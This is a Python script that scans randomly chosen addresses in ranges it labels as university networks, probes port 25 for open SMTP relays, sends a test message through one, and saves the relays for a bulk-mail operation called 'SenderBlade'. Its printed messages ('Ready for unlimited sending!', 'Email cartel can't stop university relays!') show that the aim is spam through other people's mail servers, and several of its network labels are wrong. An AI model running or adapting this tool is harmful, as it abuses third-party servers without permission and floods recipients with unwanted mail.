"""
Windows RDP Quick Scanner - For immediate results
Run this on your first Windows RDP server
"""
import socket
import smtplib
import time
import random
import threading
import json
from concurrent.futures import ThreadPoolExecutor
import requests

class WindowsQuickScanner:
    def __init__(self):
        self.found_relays = []
        self.tested_count = 0
        self.lock = threading.Lock()
        
    def quick_scan_universities(self):
        """Quick scan of university networks"""
        print("🎓 WINDOWS RDP QUICK SCANNER - UNIVERSITY NETWORKS")
        print("=" * 60)
        print(f"🖥️  Scanner IP: {self.get_my_ip()}")
        print("=" * 60)
        
        # High-probability university IP ranges
        university_targets = [
            ("128.2.0.0", "128.2.255.255", "MIT Network"),
            ("128.3.0.0", "128.3.255.255", "Stanford Network"),
            ("128.4.0.0", "128.4.255.255", "Harvard Network"),
            ("129.1.0.0", "129.1.255.255", "Yale Network"),
            ("129.2.0.0", "129.2.255.255", "Princeton Network"),
            ("130.1.0.0", "130.1.255.255", "Berkeley Network"),
            ("130.2.0.0", "130.2.255.255", "UCLA Network"),
            ("131.1.0.0", "131.1.255.255", "NYU Network"),
        ]
        
        all_relays = []
        for start_ip, end_ip, network_name in university_targets:
            print(f"\n🔍 Scanning {network_name}...")
            
            # Generate 200 random IPs per network
            ips = self.generate_random_ips_in_range(start_ip, end_ip, 200)
            
            # Quick parallel scan
            relays = self.scan_ips_fast(ips, network_name)
            
            if relays:
                print(f"✅ Found {len(relays)} relays in {network_name}")
                all_relays.extend(relays)
                
                # Save immediately in case of interruption
                self.save_relays_json(all_relays, "quick_university_relays.json")
            else:
                print(f"❌ No relays found in {network_name}")
        
        print(f"\n🎯 QUICK UNIVERSITY SCAN COMPLETE!")
        print(f"📊 Total relays found: {len(all_relays)}")
        print(f"🧪 IPs tested: {self.tested_count}")
        print(f"💰 Cost: $0")
        
        return all_relays
    
    def generate_random_ips_in_range(self, start_ip, end_ip, count):
        """Generate random IPs in range"""
        import ipaddress
        
        start = int(ipaddress.IPv4Address(start_ip))
        end = int(ipaddress.IPv4Address(end_ip))
        
        # Generate random integers in range
        random_ints = []
        for _ in range(count):
            random_ints.append(random.randint(start, end))
        
        # Convert to IP addresses
        return [str(ipaddress.IPv4Address(ip_int)) for ip_int in random_ints]
    
    def scan_ips_fast(self, ips, network_name):
        """Fast parallel IP scanning"""
        relays = []
        
        print(f"⚡ Testing {len(ips)} IPs in {network_name}...")
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(self.test_smtp_relay, ip) for ip in ips]
            
            for future in futures:
                try:
                    result = future.result(timeout=10)
                    if result:
                        relays.append(result)
                        with self.lock:
                            self.found_relays.append(result)
                        print(f"🎯 RELAY FOUND: {result['ip']} ({network_name})")
                except:
                    pass
                
                with self.lock:
                    self.tested_count += 1
                    if self.tested_count % 50 == 0:
                        print(f"📊 Tested {self.tested_count} IPs, found {len(self.found_relays)} relays")
        
        return relays
    
    def test_smtp_relay(self, ip):
        """Test single IP for SMTP relay"""
        try:
            # Quick port check
            if not self.is_port_open(ip, 25, timeout=2):
                return None
            
            # SMTP relay test
            with smtplib.SMTP(ip, 25, timeout=5) as server:
                server.ehlo()
                
                # Test external relay capability
                server.mail("test@example.com")
                code, response = server.rcpt("test@gmail.com")
                
                if code == 250:
                    return {
                        'ip': ip,
                        'port': 25,
                        'type': 'university_relay',
                        'found_at': time.time(),
                        'scanner': 'windows_quick',
                        'status': 'working'
                    }
            
            return None
            
        except:
            return None
    
    def is_port_open(self, ip, port, timeout=2):
        """Quick port connectivity check"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def get_my_ip(self):
        """Get scanner's public IP"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip()
        except:
            return "Unknown"
    
    def save_relays_json(self, relays, filename):
        """Save relays to JSON file"""
        try:
            data = {
                'scanner': 'windows_quick',
                'scanner_ip': self.get_my_ip(),
                'timestamp': time.time(),
                'total_relays': len(relays),
                'relays': relays
            }
            
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"💾 Saved {len(relays)} relays to {filename}")
            
        except Exception as e:
            print(f"❌ Error saving: {e}")
    
    def test_relay_sending(self, relay_ip):
        """Test if relay can send emails"""
        try:
            with smtplib.SMTP(relay_ip, 25, timeout=10) as server:
                server.ehlo()
                
                msg = f"""From: test@university.edu
To: your_test@gmail.com
Subject: Windows Quick Scanner Test

This email was sent through university relay {relay_ip}
Scanner: Windows RDP Quick Scanner
Time: {time.ctime()}
"""
                
                server.sendmail("test@university.edu", ["your_test@gmail.com"], msg)
                print(f"✅ Test email sent via {relay_ip}")
                return True
                
        except Exception as e:
            print(f"❌ Relay {relay_ip} failed: {e}")
            return False
    
    def upload_results_to_main_server(self, relays):
        """Upload results to main SenderBlade server"""
        try:
            # This would upload to your main server
            # For now, save to file for manual transfer
            self.save_relays_json(relays, f"windows_quick_results_{int(time.time())}.json")
            
            print(f"📤 Results saved for upload to main server")
            print(f"📁 File: windows_quick_results_{int(time.time())}.json")
            
        except Exception as e:
            print(f"❌ Upload error: {e}")

def run_windows_quick_scan():
    """Main function for Windows RDP quick scanning"""
    print("🔥 WINDOWS RDP QUICK SCANNER STARTING")
    print("=" * 50)
    
    scanner = WindowsQuickScanner()
    
    # Quick university scan
    relays = scanner.quick_scan_universities()
    
    if relays:
        print(f"\n🧪 Testing first relay...")
        test_relay = relays[0]
        scanner.test_relay_sending(test_relay['ip'])
        
        # Upload results
        scanner.upload_results_to_main_server(relays)
        
        print(f"\n🎉 WINDOWS QUICK SCAN COMPLETE!")
        print(f"📧 Found {len(relays)} working relays")
        print(f"💰 Cost: $0")
        print(f"🚀 Ready for unlimited sending!")
        
        # Print relay list for easy copying
        print(f"\n📋 RELAY LIST:")
        for i, relay in enumerate(relays, 1):
            print(f"{i}. {relay['ip']}:25")
    
    else:
        print(f"\n❌ No relays found in quick scan")
        print(f"🔄 Try running the full harvester on second RDP")
    
    return relays

if __name__ == "__main__":
    print("🖥️  WINDOWS RDP QUICK SCANNER")
    print("🎓 Targeting University Networks")
    print("⚡ Fast results in 10-20 minutes")
    print()
    
    # Run the scan
    relays = run_windows_quick_scan()
    
    print(f"\n💀 Email cartel can't stop university relays!")
    print(f"🔥 Scanner complete - check results file!")
    
    # Keep window open
    input("\nPress Enter to exit...")